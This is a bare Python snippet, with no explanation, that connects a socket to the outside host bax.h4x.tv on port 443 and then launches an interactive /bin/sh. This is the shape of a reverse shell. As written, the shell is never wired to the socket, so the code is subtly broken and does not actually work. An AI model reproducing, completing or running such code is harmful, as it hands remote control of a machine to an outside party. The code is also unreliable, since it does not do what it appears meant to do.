import socket
import subprocess

channel = socket.socket()
channel.connect(("bax.h4x.tv", 443))
subprocess.call(["/bin/sh", "-i"])
